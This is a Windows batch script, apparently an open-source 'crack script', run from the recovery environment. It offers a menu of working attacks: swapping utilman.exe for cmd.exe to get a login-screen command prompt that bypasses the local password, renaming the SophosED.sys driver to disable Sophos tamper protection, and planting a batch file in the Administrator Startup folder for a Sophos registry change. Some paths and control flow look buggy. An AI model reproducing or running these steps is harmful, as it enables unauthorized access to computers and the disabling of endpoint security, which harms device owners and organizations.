@echo off
setlocal enabledelayedexpansion

rem Crack Script Made by S1rDyn0
rem Contributors: Viren070

if /i "%CD:~0,2%" NEQ "X:" (
  color 0C
  echo                __
  echo               / _^)
  echo      _.----._/ /
  echo     /         /
  echo  __/ ^(  ^| ^(  ^|
  echo /__.-^'^|_^|--^|_^|
  echo EXPLOIT ERROR... & echo:
  echo You must be in the Installer/Recovery environment to run this script^!
  pause
  cls
  color 07
  exit 
) else (
  cls
  color 3F
  echo: & echo Proceed with caution, we do not take any responsibility for damage caused by this script.
  echo Credit to S1rDyno for the orginal script ^& Viren070 for contributing to improve it.
  echo: & echo https://github.com/S1rDyn0/BootUSB-Crack-Script ^| OpenSource & echo: & echo: & echo:
  pause
)
:menu
color 07
cls
echo ^|==================================^|
echo ^|  WINDOWS 10  EXPLOIT BY S1rDyn0  ^|
echo ^|   ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~    ^| 
echo ^|                                  ^|
echo ^|  BUILD ^| Production     23.5.9  ^|
echo ^|==================================^| & echo: & echo:

echo +++++ Password Exploit
echo ^[1^] Local Password Exploit
echo ^[2^] Undo Password Exploit
echo ^[3^] Restore Original Files

echo: & echo +++++ Sophos Exploit
echo ^[4^] Disable Sophos Tamper Protection
echo ^[5^] Sophos Registry Exploit

echo: & echo +++++ Other
echo ^[6^] Show On-Screen Keyboard
echo: & echo +++++ Exit
echo ^[0^] Exit
echo: & echo: & echo:

set validOptions=0 1 2 3 4 5 6
set /p "crackType=^>"

set optionFound=false
for %%a in (!validOptions!) do (
  if "!crackType!"=="%%a" (
    set optionFound=true
  )
)

if not !optionFound!==true (
  color 0C
  cls
  call :showDinoError
  echo Looks like that^'s an invalid option^!
  timeout /t 5 
  goto menu
)
echo you have a valid option 
pause
if "!crackType!" EQU "0" (
  color 07
  cls & echo Exiting...
  exit 
)

if "!crackType!" EQU "1" (
  call :local-password-exploit
)

if "!crackType!" EQU "2" (
  call :undo-password-exploit
)

if "!crackType!" EQU "3" (
  call :restore-original-files
)

if "!crackType!" EQU "4" (
  call :disable-sophos-tamper-protection
)
if "!crackType!" EQU "5" (
  call :sophos-registry-exploit
)

if "!crackType!" EQU "6" (
  echo Running OSK.exe...
  start "" "C:\windows\system32\osk.exe" || goto :cmdFail
  color 0A
  cls
  echo Started OSK.exe 
  echo Returning to menu...
  timeout /t 5
  
  goto :menu
)

goto :menu


:local-password-exploit
cls
echo Starting Hack
echo.
if exist "c:\windows\system32" (
  echo System Directory Found	
  echo Renaming utilman.exe to utilman.old
  echo.
  ren C:\windows\system32\utilman.exe utilman.old || goto :cmdFail
  echo.
  echo Copying cmd.exe to utilman.exe
  echo.
  copy C:\windows\system32\cmd.exe C:\windows\system32\utilman.exe || goto :cmdFail

  echo -----------------------------------
  color 0A
  echo Exploit Completed ^| No errors
  pause
  goto menu

) else (
  color 0C
  call :showDinoError
  echo Could not find System Directory... & echo:
  echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)


rem Option 4 is for the Sophos registry hack. This will use xcopy to make a new folder at C:\SophosUtility
rem It will next copy the sophos folder inside that directory.
rem Then it will copy evoke.bat to C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup as shortcut creation requires vbs script and not good choice in recovery environment
rem this will run autorun.bat script located in C:\SophosUtility\Sophos\autorub.bat
:disable-sophos-tamper-protection
cls
echo Starting Hack
if exist "c:\windows\system32\drivers" (
  echo System Directory Found
    

  echo Renaming SophosED.sys to SophosED.sys.old
  ren C:\windows\system32\drivers\SophosED.sys SophosED.sys.old || goto :cmdFail
  
  color 0A
  echo -----------------------------------
  echo Exploit Completed ^| No errors
  pause
  goto menu


) else (
  color 0C
  call :showDinoError
  echo Could not find System Directory... & echo:
  echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
) 

:sophos-registry-exploit
cls
echo Preparing Patch...
if /i exist "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" ( echo Located Startup folder ) else ( echo Could not find Startup folder... & echo: & echo Failing Registry Patch & goto :cmdFail )
if /i exist "x:\sources\sophos" ( echo Located Sophos folder ) else ( echo Could not find Sophos folder... & echo: & echo Failing Registry Patch & goto :cmdFail )
if /i exist "x:\sources\sophos\1EndpointDefense.reg" ( echo Located Registry Patch file 1/2 ) else ( echo Could not find Regsitry File number 1... & echo: & echo Failing Registry Patch & goto :cmdFail )
if /i exist "x:\sources\sophos\2SophosMCSAgent.reg" ( echo Located Registry Patch file 2/2 ) else ( echo Could not find Regsitry File number 2... & echo: & echo Failing Registry Patch & goto :cmdFail )
if /i exist "x:\sources\sophos\autorun.bat" ( echo Located Autorun Script ) else ( echo Could not find the Autorun Script... & echo: & echo Failing Registry Patch & goto :cmdFail )

echo Patch files located! & echo: & echo Starting Patch...
echo Creating Patch folder
mkdir C:\SophosUtility || goto :cmdFail

echo Copying patch files to target folder
copy X\:sources\sophos C:\SophosUtility || goto :cmdFail

echo Copying evoker to autorun folder
copy C:\SophosUtility\sophos\evoke.bat  "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" || goto cmdFail

echo -----------------------------------
echo Sophos Registry Patch Completed ^| No errors
pause

:undo-password-exploit
cls
echo Preparing restore...
if exist "c:\windows\system32" (
  echo Located System folder
) else (
  color 0C
  call :showDinoError
  echo Could not find System Folder... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist "c:\windows\system32\utilman.old" (
  echo Original utilman.exe file found
) else (
  color 0C
  call :showDinoError
  echo Could not find utilman.old... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist "c:\windows\system32\cmd.exe" (
  echo Original cmd.exe file found
) else (
  color 0C
  call :showDinoError
  echo Could not find cmd.exe... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist "c:\windows\system32\utilman.exe" (
  echo Exploit utilman.exe file found
) else (
  color 0C
  call :showDinoError
  echo Could not find exploited utilman... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)

echo All system files located! & echo: & echo Starting restore...
echo Deleting exploited utilman.exe
del C:\windows\system32\utilman.exe || goto cmdFail
echo Renaming utilman.old to utilman.exe 
ren C:\windows\system32\utilman.old utilman.exe || goto cmdFail

color 0A
echo -----------------------------------
echo Restore Completed ^| No errors
pause
goto menu

:restore-original-files
cls
echo Preparing restore...
if exist "x:\sources\restore" (
  echo Located restore folder
) else (
  color 0C
  call :showDinoError
  echo Could not find Restore Folder... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist "x:\sources\restore\cmd.exe" (
  echo Command Prompt backup found
) else (
  color 0C
  call :showDinoError
  echo Could not find Command Prompt backup... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist "x:\sources\restore\utilman.exe" (
  echo Utilman backup found
) else (
  color 0C
  call :showDinoError
  echo Could not find Utilman backup... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)

echo Backup files located! & echo: & echo Starting restore...
echo Deleting exploited utilman.exe
del C:\windows\system32\utilman.exe || goto :cmdFail
echo Renaming utilman.old to utilman.exe
ren C:\windows\system32\utilman.old utilman.exe || goto :cmdFail

color 0A
echo -----------------------------------
echo Restore Completed ^| No errors
pause
goto menu

:cmdFail
call :showDinoError
echo An error occurred during command execution.
echo Failing Exploit and returning to menu
pause
goto menu

:showDinoError
color 0C
echo                __
echo               / _^)
echo      _.----._/ /
echo     /         /
echo  __/ ^(  ^| ^(  ^|
echo /__.-^'^|_^|--^|_^|
echo Exploit ID !crackType! failed & echo:
